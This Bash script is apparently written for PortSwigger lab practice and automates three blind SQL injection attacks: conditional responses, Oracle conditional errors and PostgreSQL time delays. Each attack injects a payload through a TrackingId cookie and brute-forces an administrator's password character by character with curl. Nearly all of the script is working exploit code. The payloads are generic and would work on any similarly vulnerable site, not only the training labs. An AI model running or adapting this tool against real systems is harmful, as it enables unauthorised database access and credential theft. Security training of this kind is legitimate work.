#!/usr/bin/env bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

echo "=================================================================================================="
echo -e "${yellowColour}Learning and Practicing SQL Injection and Bash Scripting with${endColour} ${purpleColour}PortSwigger${endColour}"
echo "=================================================================================================="

function ctrl_c() {
  echo -e "\n\n${redColour}[!] Keyboard interrupt detected, terminating.${endColour}\n"
  exit 1
}

# Ctrl+C
trap ctrl_c INT

function HelpPanel() {
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Uses:\n    ./portswiggersqli.sh [flag]${endColour}"
  echo -e "\n${yellowColour}[->]${endColour}${grayColour} Available Flags:\n${endColour}"
  echo -e "\t${purpleColour}-r${endColour}${grayColour} Lab: Blind SQL injection with conditional responses ${endColour}"
  echo -e "\t${purpleColour}-e${endColour}${grayColour} Lab: Blind SQL injection with conditional errors (Oracle) ${endColour}"
  echo -e "\t${purpleColour}-t${endColour}${grayColour} Lab: Blind SQL injection with time delays and information retrieval (PostgreSQL)${endColour}"
  echo -e "\t${purpleColour}-h${endColour}${grayColour} Help${endColour}\n"
}

function blind_responses() {
  echo -e "${yellowColour}Please enter a valid URL: ${endColour}"
  read url
  echo -e "${yellowColour}Please enter a valid session${endColour}${purpleColour}(Check your browser's cookies): ${endColour}"
  read sessionn
  echo -e "${yellowColour}Please enter a valid TrackingId: ${endColour}"
  read TrackingID
  characters=({a..z} {0..9})

  password=""
  total_positions=20
  total_characters=${#characters[@]}

  echo "=================================================================================================="
  echo -e "\n${yellowColour}Starting Brute Force Attack${endColour} ${redColour}>>${endColour} ${purpleColour}Blind SQL injection with conditional responses ${endColour}\n"
  echo "=================================================================================================="

  for ((position = 1; position <= total_positions; position++)); do
    found_char=0
    for ((i = 0; i < total_characters; i++)); do
      character=${characters[i]}

      TrackingId="$TrackingID' and (select substring(password,$position,1) from users where username='administrator')='$character"
      cookies="TrackingId=$TrackingId; session=$sessionn"
      echo -ne "\r${yellowColour}[+]${endColour}${grayColour} Showing password:${endColour}${redColour}[${endColour}${grayColour}$password$character${endColour}${redColour}]${endColour}"
      response=$(curl -s -b "$cookies" "$url")

      if [[ $response == *"Welcome back!"* ]]; then
        password+=$character
        found_char=1
        break
      fi
    done

    if [[ $found_char -eq 0 ]]; then
      password+="?"
    fi
  done

  echo -e "\n${yellowColour}[!]${endColour}${grayColour} Password found${endColour}${redColour} >>> ${endColour}${grayColour}$password${endColour}\n"
}

function blind_error() {
  echo -e "${yellowColour}Please enter a valid URL: ${endColour}"
  read url
  echo -e "${yellowColour}Please enter a valid session${endColour}${purpleColour}(Check your browser's cookies): ${endColour}"
  read sessionn
  echo -e "${yellowColour}Please enter a valid TrackingId: ${endColour}"
  read TrackingID
  characters=({a..z} {0..9})

  password=""
  total_positions=20
  total_characters=${#characters[@]}

  echo "=================================================================================================="
  echo -e "\n${yellowColour}Starting Brute Force Attack${endColour} ${redColour}>>${endColour} ${purpleColour}Blind SQL injection with conditional errors${endColour}\n"
  echo "=================================================================================================="

  for ((position = 1; position <= total_positions; position++)); do
    found_char=0
    for ((i = 0; i < total_characters; i++)); do
      character=${characters[i]}

      TrackingId="$TrackingID'||(select case when substr(password,$position,1)='$character' then to_char(1/0) else '' end from users where username='administrator')||'"
      cookies="TrackingId=$TrackingId; session=$sessionn"
      echo -ne "\r${yellowColour}[+]${endColour}${grayColour} Showing password:${endColour}${redColour}[${endColour}${grayColour}$password$character${endColour}${redColour}]${endColour}"
      response=$(curl -s -b "$cookies" "$url")

      if echo "$response" | grep -q "Internal Server Error"; then
        password+=$character
        found_char=1
        break
      fi
    done

    if [[ $found_char -eq 0 ]]; then
      password+="?"
    fi
  done

  echo -e "\n${yellowColour}[!]${endColour}${grayColour} Password found${endColour}${redColour} >>> ${endColour}${grayColour}$password${endColour}\n"
}

function blind_time_delay() {
  echo -e "${yellowColour}Please enter a valid URL: ${endColour}"
  read url
  echo -e "${yellowColour}Please enter a valid session${endColour}${purpleColour}(Check your browser's cookies): ${endColour}"
  read sessionn
  echo -e "${yellowColour}Please enter a valid TrackingId: ${endColour}"
  read TrackingID
  characters=$(echo {a..z} {0..9} | tr ' ' '\n')

  password=""

  echo "=================================================================================================="
  echo -e "\n${yellowColour}Starting Brute Force Attack${endColour} ${redColour}>>${endColour} ${purpleColour}Blind SQL injection with time delays and information retrieval${endColour}\n"
  echo "=================================================================================================="

  for ((position = 1; position <= 20; position++)); do
    for character in $characters; do
      tracking_id="$TrackingID'||(select case when substring(password,$position,1)='$character' then pg_sleep(15) else pg_sleep(0) end from users where username='administrator')-- -"
      cookies="TrackingId=$tracking_id; session=$sessionn"
      echo -ne "\r${yellowColour}[+]${endColour}${grayColour} Showing password:${endColour}${redColour}[${endColour}${grayColour}$password$character${endColour}${redColour}]${endColour}"

      time_start=$(date +%s.%N)
      response=$(curl -s -b "$cookies" "$url")
      time_stop=$(date +%s.%N)
      duration=$(echo "$time_stop - $time_start" | bc)

      if (( $(echo "$duration >= 15" | bc -l) )); then
        password+="$character"
        break
      fi
    done
  done

  echo -e "\n${yellowColour}[!]${endColour}${grayColour} Password found${endColour}${redColour} >>> ${endColour}${grayColour}$password${endColour}\n"
}

# Indicators
declare -i parameter_counter=0

while getopts "reth" arg; do
  case $arg in
    r) let parameter_counter+=1 ;;
    e) let parameter_counter+=2 ;;
    t) let parameter_counter+=3 ;;
    h) ;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  blind_responses
elif [ $parameter_counter -eq 2 ]; then
  blind_error
elif [ $parameter_counter -eq 3 ]; then
  blind_time_delay
else
  HelpPanel
fi

